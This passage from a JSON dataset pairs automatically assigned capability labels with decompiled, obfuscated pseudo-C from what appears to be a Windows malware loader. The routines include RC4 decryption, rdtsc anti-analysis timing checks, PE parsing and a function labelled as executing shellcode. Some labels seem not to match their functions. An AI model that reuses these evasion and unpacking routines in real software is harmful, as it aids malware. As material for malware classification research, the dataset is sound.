uStack48 = uVar2 ^ 0xffffffff;\n        if (uStack132 < 5) {\n            uStack22 = 0x8322;\n            iStack72 = fcn.00402e58(puStack56, 0);\n            iStack136 = iStack72;\n            uStack48 = uVar2 | 0x252951b0;\n            uStack140 = uStack132 + (0x4b598ca3 - uStack52);\n            if (uStack140 <= (uStack52 ^ 0x4b598ca5)) {\n                if (iStack72 + *(iStack72 + 0x3c) == 0 || *(iStack72 + *(iStack72 + 0x3c)) != 0x4550) {\n                    iStack72 = 0;\n                }\n                return iStack72;\n            }\n        }\n        else {\n            uStack48 = 0x343288c8;\n            uStack140 = uStack132 + uStack52 + 0xb4a6735b;\n        }\n        uStack148 = uStack140;\n    }\n    return 0;\n}\n",
        "token_count": 1710
    },
    "0040210d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004021a8)\n\nuint __cdecl fcn.0040210d(int32_t arg_8h, uint noname_1, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iStack60;\n    uint uStack56;\n    uint var_bp_ch;\n    \n    uStack56 = 0;\n    if (arg_8h != 0) {\n        iStack60 = 0;\n        do {\n            *(arg_10h + iStack60) = *(iStack60 + 0x435c8d) - *(iStack60 + 0x435cc5);\n            iStack60 = iStack60 + 1;\n        } while (iStack60 != 0xe);\n        uVar1 = fcn.00406740();\n        uVar1 = fcn.004027c4(uVar1, arg_10h);\n        *arg_14h = uVar1;\n        *(arg_8h + 4) = 0x13a00;\n        *(arg_8h + 0xc) = 0x4620;\n        uStack56 = 1;\n    }\n    return uStack56;\n}\n",
        "token_count": 289
    },
    "004022ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.004022ae(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iStack56;\n    uint var_bp_ch;\n    \n    iVar1 = 0;\n    do {\n        iStack56 = iVar1;\n        iVar1 = iStack56 + 1;\n    } while (*(arg_8h + iStack56) != '\\0');\n    return iStack56;\n}\n",
        "token_count": 111
    },
    "004027c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004027c4(uint arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint uStack164;\n    uint uStack160;\n    code *pcStack156;\n    ushort uStack152;\n    ushort uStack150;\n    int32_t iStack148;\n    uint32_t uStack144;\n    uint32_t uStack140;\n    ushort uStack134;\n    ushort *puStack132;\n    uint32_t uStack128;\n    uint32_t uStack124;\n    uint uStack116;\n    uint32_t uStack112;\n    uint16_t uStack106;\n    uint32_t uStack104;\n    char acStack98 [32];\n    ushort uStack66;\n    int32_t iStack64;\n    uint16_t uStack58;\n    code *pcStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    uint16_t uStack44;\n    uint16_t uStack42;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack28;\n    uint8_t uStack21;\n    uint var_ch;\n    \n    uVar5 = uStack21;\n    uVar4 = uStack28;\n    uVar3 = uStack36;\n    uVar2 = uStack40;\n    uVar1 = uStack44;\n    uStack42 = 0xe4ea;\n    uStack48 = 0x6f342d56;\n    uStack124 = 0;\n    uStack128 = 0x7f69885;\n    uStack134 = 0xaa08;\n    uStack106 = 0x18ab;\n    uStack144 = 0;\n    do {\n        uVar8 = uStack48 + 0x90cbd2c2;\n        iVar7 = 0x6f342d57 - uStack48;\n        acStack98[uStack144] = *(uStack144 + 0x435c75) - *((uStack144 & 0xf) + 0x435cc5);\n        uStack144 = uStack144 + iVar7;\n    } while (uStack144 != uVar8);\n    uVar8 = uStack112;\n    uVar6 = uStack40 ^ 0x445e8c40;\n    if (uStack42 != 0xec08) {\n        iStack64 = -0x46ff5a96 - uStack48;\n        uStack36 = ~uStack36;\n        uVar6 = ~uStack40;\n        if (iStack64 == 0x683ef57c) goto code_r0x00402d85;\n    }\n    while( true ) {\n        uStack40 = uVar6;\n        uStack112 = uVar8;\n        uStack52 = 0;\n        uStack28 = uVar4 ^ 0x6cadb4d8;\n        if (arg_ch == 0) {\n            return 0;\n        }\n        uStack44 = uVar1 ^ 0x92f8;\n        uVar8 = 0xab262e09 - uStack48;\n        uStack21 = uVar5 * -0x65;\n        uStack140 = uVar8;\n        pcStack156 = fcn.00402383(acStack98);\n        if ((uVar8 < 0x3d3ff369) && (uStack52 = 0,  pcStack156 == NULL)) {\n            return 0;\n        }\n        uStack116 = 0x17843eff;\n        puStack132 = &uStack152;\n        uStack36 = 0;\n        uStack40 = 0x52014d0;\n        pcStack56 = pcStack156;\n        if (uStack48 + 0xfbb743ee < 0x17843eff) break;\n        iStack148 = arg_ch;\n        uStack112 = 0;\n        uVar8 = uStack112;\n        while( true ) {\n            do {\n                uStack112 = uVar8;\n                uStack104 = uStack112;\n                uVar8 = (uStack48 ^ 0x6f342d57) + uStack112;\n            } while (*(arg_ch + uStack112) != '\\0');\n            uStack58 = uStack106;\n            uVar6 = uStack40;\n            if ((uStack128 ^ 0x556d5d0b | uStack124) == 0) break;\n            uStack152 = uStack112;\n            uStack28 = 0x8002c0f;\n            uStack112 = 0x10ca2920;\n            uVar8 = uStack112;\n            uStack66 = uStack152;\n            if (uStack106 <= (uStack42 ^ 0xb51c)) goto code_r0x00402d85;\n        }\n    }\ncode_r0x00402d85:\n    uStack150 = uStack66;\n    uStack21 = uVar5 ^ 0x8c;\n    uStack164 = 0;\n    if ((uStack48 + 0x90ccd2a9 & uStack104) != 0) {\n        uStack160 = 0;\n        uStack40 = uVar2 * 2;\n        uStack36 = uVar3 * 2 + CARRY4(uVar2, uVar2);\n        (*pcStack56)(arg_8h, &uStack152, uStack42 ^ 0xe4ea, &uStack160);\n        uStack164 = uStack160;\n    }\n    return uStack164;\n}\n",
        "token_count": 1279
    },
    "004031ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint16_t * __cdecl fcn.004031ed(int32_t arg_8h)\n\n{\n    code *pcStack76;\n    int16_t *piStack64;\n    uint var_bp_ch;\n    \n    if (arg_8h == 0) {\n        for (pcStack76 = fcn.00405c1b;\n            (*pcStack76 != 0x5a4d || (piStack64 = pcStack76,  *(pcStack76 + *(pcStack76 + 0x3c)) != 0x4550));\n            pcStack76 = pcStack76 + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        piStack64 = fcn.00402e58(arg_8h, 0);\n    }\n    return piStack64;\n}\n",
        "token_count": 193
    },
    "004033f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.004033f5(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack64;\n    uint var_bp_ch;\n    \n    if (arg_10h != 0) {\n        uStack64 = 0;\n        do {\n            *(arg_8h + uStack64) = *(arg_ch + uStack64) - *((uStack64 & 0xf) + 0x435cc5);\n            uStack64 = uStack64 + 1;\n        } while (uStack64 != arg_10h);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl entry0(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    uint in_EAX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    *(unaff_EBP + -4) = in_EAX;\n    *0x43b414 = *0x43b414 ^ 0x3208;\n    *0x43b408 = unaff_EBX;\n    *0x43b40c = unaff_EBP;\n    *0x43b410 = *0x10;\n    fcn.00401091();\n    return;\n}\n",
        "token_count": 171
    },
    "00406174": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00406174(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iStack56;\n    uint var_bp_ch;\n    \n    arg_8h_00 = fcn.00401c59(0x40, 0x1a000);\n    iStack56 = 0;\n    if (arg_8h_00 != 0) {\n        fcn.00405e66(arg_8h_00, arg_ch);\n        *(arg_8h + 0x48) = arg_8h_00;\n        *(arg_8h + 0x4c) = arg_8h_00 + -0x400000;\n        iStack56 = arg_8h_00 + 0x1aa9;\n    }\n    return iStack56;\n}\n",
        "token_count": 208
    },
    "00402df8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402df8(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00406740();\n    fcn.004027c4(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 67
    },
    "0040347f": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004037a3)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040347f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uStack344;\n    int32_t iStack340;\n    uint8_t auStack324 [256];\n    int32_t iStack68;\n    uchar auStack64 [16];\n    uint32_t uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint8_t uStack25;\n    uint32_t uStack24;\n    uint var_bp_ch;\n    \n    uVar2 = uStack24;\n    uStack48 = 0x29d745a7;\n    uStack24 = 0x59f17dbb;\n    iStack68 = 0;\n    auStack64 = CONCAT412(*0x40711c, CONCAT48(*0x407118, CONCAT44(*0x407114, *0x407110)));\n    do {\n        uVar4 = uStack48 ^ 0x29d745b7;\n        auStack324[iStack68] = auStack64[0];\n        auStack324[iStack68 + 1] = auStack64[1];\n        auStack324[iStack68 + 2] = auStack64[2];\n        auStack324[iStack68 + 3] = auStack64[3];\n        auStack324[iStack68 + 4] = auStack64[4];\n        auStack324[iStack68 + 5] = auStack64[5];\n        auStack324[iStack68 + 6] = auStack64[6];\n        auStack324[iStack68 + 7] = auStack64[7];\n        auStack324[iStack68 + 8] = auStack64[8];\n        auStack324[iStack68 + 9] = auStack64[9];\n        auStack324[iStack68 + 10] = auStack64[10];\n        auStack324[iStack68 + 0xb] = auStack64[11];\n        auStack324[iStack68 + 0xc] = auStack64[12];\n        auStack324[iStack68 + 0xd] = auStack64[13];\n        auStack324[iStack68 + 0xe] = auStack64[14];\n        auStack324[iStack68 + 0xf] = auStack64[15];\n        iStack68 = iStack68 + uVar4;\n        uStack24 = uVar2 * 2;\n        auStack64 = CONCAT115(auStack64[15] + *0x40712f, \n                              CONCAT114(auStack64[14] + *0x40712e, \n                                        CONCAT113(auStack64[13] + *0x40712d, \n                                                  CONCAT112(auStack64[12] + *0x40712c, \n                                                            CONCAT111(auStack64[11] + *0x40712b, \n                                                                      CONCAT110(auStack64[10] + *0x40712a, \n                                                                                CONCAT19(auStack64[9] + *0x407129, \n                                                                                         CONCAT18(auStack64[8] +\n                                                                                                  *0x407128, \n                                                                                                  CONCAT17(auStack64[7]\n                                                                                                           + *0x407127, \n                                                                                                           CONCAT16(\n                                                            auStack64[6] + *0x407126, \n                                                            CONCAT15(auStack64[5] + *0x407125, \n                                                                     CONCAT14(auStack64[4] + *0x407124, \n                                                                              CONCAT13(auStack64[3] + *0x407123, \n                                                                                       CONCAT12(auStack64[2] + *0x407122\n                                                                                                , CONCAT11(auStack64[1]\n                                                                                                           + *0x407121, \n                                                                                                           auStack64[0]\n                                                                                                           + *0x407120))\n                                                                                      )))))))))))));\n    } while (iStack68 != 0x100);\n    iStack340 = 0;\n    uStack25 = 0;\n    uStack344 = 0;\n    do {\n        uVar4 = 0x29d746a7 - uStack48;\n        uStack25 = ~uStack25 | 0xe5;\n        uVar1 = auStack324[uStack344];\n        iVar3 = 0x29d745a8 - uStack48;\n        uStack24 = ~uVar2;\n        uStack25 = 0x43;\n        iStack340 = (iStack340 + uVar1 + *(uStack344 + 0x435c9b + (uStack344 / 0x29) * -0x29)) % (uStack48 ^ 0x29d744a7)\n        ;\n        uStack36 = 0;\n        uStack40 = 0xb54f2f9;\n        auStack324[uStack344] = auStack324[iStack340];\n        auStack324[iStack340] = uVar1;\n        uStack344 = uStack344 + iVar3;\n    } while (uStack344 != uVar4);\n    uStack24 = 0x52e1ff47;\n    fcn.00405077(auStack324, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 1216
    },
    "004052bc": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.004052bc(int32_t *arg_8h)\n\n{\n    uchar *arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint arg_8h_00;\n    uint32_t uVar8;\n    int32_t arg_10h;\n    int32_t in_stack_ffffff34;\n    int32_t iStack112;\n    code *pcStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uchar auStack80 [32];\n    uint32_t uStack48;\n    int16_t iStack42;\n    uint uStack40;\n    uint16_t uStack36;\n    char cStack33;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uint var_bp_ch;\n    \n    iVar7 = iStack28;\n    uVar6 = uStack32;\n    cVar5 = cStack33;\n    uVar4 = uStack36;\n    iStack42 = 0x7173;\n    uStack48 = 0x404ff41d;\n    uStack36 = 0x4c00;\n    iStack112 = 0;\n    iStack100 = 0;\n    do {\n        uStack40 = 0x404ff41d;\n        iStack112 = (*(iStack100 * 0x120 + 0x43911c) + iStack112) - *(iStack100 * 0x120 + 0x439114);\n        iStack100 = iStack100 + 1;\n        iStack92 = iStack112;\n    } while (iStack100 != 0x20);\n    do {\n        fcn.0040210d(arg_8h, in_stack_ffffff34, auStack80, &pcStack104);\n        uStack36 = uVar4 | 0xc582;\n        iStack96 = (*pcStack104)(0, iStack92, uStack48 ^ 0x404fe41d, uStack48 + 0xbfb00be7);\n        *arg_8h = iStack96 + 0xffdc;\n        arg_8h[2] = iStack96 + 0xb4c3;\n        iStack84 = 0;\n        uStack88 = 0;\n        do {\n            iVar2 = iStack84;\n            uVar1 = uStack88;\n            arg_ch = *(uStack88 * 0x120 + 0x439118);\n            uStack40 = 0x3341032d;\n            cStack33 = cVar5 + -0xf;\n            arg_10h = *(uStack88 * 0x120 + 0x43911c) - *(uStack88 * 0x120 + 0x439114);\n            uVar8 = uStack48 ^ 0x404ff43d;\n            *(iStack96 + iStack84) = *arg_ch;\n            fcn.0040563a(iStack96 + iStack84, arg_ch, arg_10h);\n            arg_8h_00 = fcn.00406740();\n            fcn.004027c4(arg_8h_00, auStack80);\n            iVar3 = iStack42;\n            iStack84 = arg_10h + iVar2;\n            uStack88 = uVar1 + 1;\n        } while (uStack88 != uVar8);\n        uStack32 = uVar6 + 0xc7900917;\n        iStack28 = iVar7 + -1 + (0x386ff6e8 < uVar6);\n        in_stack_ffffff34 = iStack96;\n        fcn.0040347f(iStack96, iStack96, iStack92);\n    } while (iVar3 == 0x1ef0);\n    return 0;\n}\n",
        "token_count": 900
    },
    "0040596a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.0040596a(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar in_XMM1 [16];\n    int32_t iStack164;\n    int32_t iStack152;\n    uint64_t auStack144 [4];\n    uchar auStack112 [64];\n    int32_t iStack48;\n    int16_t iStack42;\n    uint32_t uStack40;\n    uint16_t uStack34;\n    uchar uStack21;\n    uint var_bp_ch;\n    \n    uVar2 = uStack40;\n    iStack42 = 0x21bd;\n    iStack48 = 0x6cb2e1b7;\n    iStack164 = 0;\n    do {\n        do {\n            iVar3 = 0x6cb2e1b8 - iStack48;\n            uStack21 = 0;\n            uStack34 = uStack34 | 0x2f04;\n            *(auStack144 + iStack164) = *(iStack164 + 0x435c5c) - *(iStack164 + 0x435cc5);\n            uStack34 = uStack34 | 0xb490;\n            iStack164 = iStack164 + iVar3;\n        } while (iStack164 != 0xb);\n        iStack152 = iStack48 + -0x6cb2e1b7;\n        while( true ) {\n            uStack40 = ~uVar2;\n            iStack164 = -0x394550a6 - iStack48;\n            uStack34 = uStack34 + 0x50e4 | 0x1414;\n            uVar1 = *(auStack144 + iStack152);\n            if (0x4d91U - iStack42 < 0x1cfe) break;\n            iVar4 = iStack48 + -0x6cb2e1af;\n            in_XMM1 = psraw(CONCAT142(SUB1614(CONCAT133(CONCAT121(SUB1612(CONCAT115(CONCAT101(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(uVar1 >> 0x38, \n                                                                      CONCAT114(SUB161(in_XMM1 >> 0x38, 0), \n                                                                                SUB1614(in_XMM1, 0))) >> 0x70, 0), \n                                                            CONCAT113(uVar1 >> 0x30, SUB1613(in_XMM1, 0))) >> 0x68, 0), \n                                                            CONCAT112(SUB161(in_XMM1 >> 0x30, 0), SUB1612(in_XMM1, 0)))\n                                                            >> 0x60, 0), CONCAT111(uVar1 >> 0x28, SUB1611(in_XMM1, 0)))\n                                                            >> 0x58, 0), \n                                                            CONCAT110(SUB161(in_XMM1 >> 0x28, 0), SUB1610(in_XMM1, 0)))\n                                                            >> 0x50, 0), CONCAT19(uVar1 >> 0x20, SUB169(in_XMM1, 0))) >>\n                                                            0x48, 0), \n                                                            CONCAT18(SUB161(in_XMM1 >> 0x20, 0), SUB168(in_XMM1, 0))) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (SUB167(in_XMM1, 0) >> 0x18) << 0x30) >> 0x30, 0), \n                                                            uVar1 >> 0x10), (SUB165(in_XMM1, 0) >> 0x10) << 0x20) >>\n                                                            0x20, 0), uVar1 >> 8), (SUB163(in_XMM1, 0) >> 8) << 0x10) >>\n                                              0x10, 0), SUB162(in_XMM1, 0) & 0xff | uVar1 << 8), 8);\n            iVar3 = 0x6cb2e1d7 - iStack48;\n            *(auStack112 + iStack152 * 2) = in_XMM1;\n            iStack152 = iVar4 + iStack152;\n            uStack34 = (uStack34 ^ 0x96e3) * (uStack34 ^ 0x96e3);\n            if (iStack152 == iVar3) {\n                uStack40 = uVar2 + 0xa56a8be9;\n                fcn.00402e58(auStack112, 0);\n                return;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1110
    },
    "00401ff4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00402063)\n\nint32_t __cdecl fcn.00401ff4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_bp_ch;\n    \n    return arg_ch * arg_ch * arg_ch + arg_8h * arg_8h * arg_8h;\n}\n",
        "token_count": 92
    },
    "004037c5": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00403899)\n\nvoid __cdecl fcn.004037c5(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_bp_ch;\n    \n    *(arg_8h + arg_10h) = *(arg_ch + arg_10h) - arg_14h;\n    return;\n}\n",
        "token_count": 109
    },
    "0040581a": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool __fastcall fcn.0040581a(uint32_t param_1, uint32_t param_2)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    uint32_t uStack56;\n    int32_t iStack52;\n    uint32_t uStack48;\n    uint var_bp_ch;\n    \n    iStack52 = 0;\n    uStack56 = param_2;\n    uStack48 = param_1;\n    do {\n        uVar1 = rdtsc();\n        uVar2 = rdtsc();\n        uVar3 = uVar2 - uVar1;\n        if (iStack52 == 0) {\n            uStack56 = uVar3;\n            uStack48 = uVar3;\n        }\n        if (uVar3 < uStack56) {\n            uStack56 = uVar3;\n        }\n        if (uStack48 < uVar3) {\n            uStack48 = uVar3;\n        }\n        iStack52 = iStack52 + 1;\n    } while (iStack52 != 100);\n    return uStack48 == uStack56 && (uStack56 == 0 || (uStack56 == 0x53 || uStack56 == 3));\n}\n",
        "token_count": 288
    },
    "00405e66": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "encode data using XOR",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00405e66(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if (*(arg_ch + *(arg_ch + 0x3c)) == 0x4550) {\n        iVar1 = arg_ch + *(arg_ch + 0x3c);\n    }\n    if (*(iVar1 + 6) != 0) {\n        iStack56 = *(iVar1 + 0x14) + 0x18 + iVar1;\n        uStack60 = 0;\n        do {\n            fcn.0040563a(arg_8h + *(iStack56 + 0xc), arg_ch + *(iStack56 + 0x14), *(iStack56 + 0x10));\n            uStack60 = uStack60 + 1;\n            iStack56 = iStack56 + 0x28;\n        } while (uStack60 < *(iVar1 + 6));\n    }\n    fcn.0040563a(arg_8h, arg_ch, *(iVar1 + 0x54));\n    return;\n}\n",
        "token_count": 284
    },
    "00404de7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404de7(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uStack100;\n    int32_t iStack92;\n    int32_t iStack84;\n    uchar auStack80 [16];\n    uint var_bp_ch;\n    \n    iStack92 = 0;\n    auStack80 = CONCAT412(*0x40711c, CONCAT48(*0x407118, CONCAT44(*0x407114, *0x407110)));\n    do {\n        pcVar1 = arg_8h + iStack92;\n        *pcVar1 = auStack80[0];\n        pcVar1[1] = auStack80[1];\n        pcVar1[2] = auStack80[2];\n        pcVar1[3] = auStack80[3];\n        pcVar1[4] = auStack80[4];\n        pcVar1[5] = auStack80[5];\n        pcVar1[6] = auStack80[6];\n        pcVar1[7] = auStack80[7];\n        pcVar1[8] = auStack80[8];\n        pcVar1[9] = auStack80[9];\n        pcVar1[10] = auStack80[10];\n        pcVar1[0xb] = auStack80[11];\n        pcVar1[0xc] = auStack80[12];\n        pcVar1[0xd] = auStack80[13];\n        pcVar1[0xe] = auStack80[14];\n        pcVar1[0xf] = auStack80[15];\n        iStack92 = iStack92 + 0x10;\n        auStack80 = CONCAT115(auStack80[15] + *0x40712f, \n                              CONCAT114(auStack80[14] + *0x40712e, \n                                        CONCAT113(auStack80[13] + *0x40712d, \n                                                  CONCAT112(auStack80[12] + *0x40712c, \n                                                            CONCAT111(auStack80[11] + *0x40712b, \n                                                                      CONCAT110(auStack80[10] + *0x40712a, \n                                                                                CONCAT19(auStack80[9] + *0x407129, \n                                                                                         CONCAT18(auStack80[8] +\n                                                                                                  *0x407128, \n                                                                                                  CONCAT17(auStack80[7]\n                                                                                                           + *0x407127, \n                                                                                                           CONCAT16(\n                                                            auStack80[6] + *0x407126, \n                                                            CONCAT15(auStack80[5] + *0x407125, \n                                                                     CONCAT14(auStack80[4] + *0x407124, \n                                                                              CONCAT13(auStack80[3] + *0x407123, \n                                                                                       CONCAT12(auStack80[2] + *0x407122\n                                                                                                , CONCAT11(auStack80[1]\n                                                                                                           + *0x407121, \n                                                                                                           auStack80[0]\n                                                                                                           + *0x407120))\n                                                                                      )))))))))))));\n    } while (iStack92 != 0x100);\n    uStack100 = 0;\n    iStack84 = 0;\n    do {\n        uVar2 = *(arg_8h + uStack100);\n        iVar3 = iStack84 + uVar2 + *(arg_ch + uStack100 % arg_10h);\n        iStack84 = iVar3 % 0x100;\n        *(arg_8h + uStack100) = *(arg_8h + iStack84);\n        *(arg_8h + iStack84) = uVar2;\n        uStack100 = uStack100 + 1;\n    } while (uStack100 != 0x100);\n    return iVar3 / 0x100;\n}\n",
        "token_count": 897
    },
    "00405077": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00405077(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    uint var_ch;\n    \n    if (arg_14h != 0) {\n        iStack84 = 0;\n        iStack88 = 0;\n        iStack80 = 0;\n        do {\n            iStack80 = (iStack80 + 1) % 0x100;\n            uVar1 = *(arg_8h + iStack80);\n            iStack84 = (iStack84 + uVar1) % 0x100;\n            *(arg_8h + iStack80) = *(arg_8h + iStack84);\n            *(arg_8h + iStack84) = uVar1;\n            *(arg_ch + iStack88) = *(arg_8h + (*(arg_8h + iStack80) + uVar1 & 0xff)) ^ *(arg_10h + iStack88);\n            iStack88 = iStack88 + 1;\n        } while (iStack88 != arg_14h);\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "0040563a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
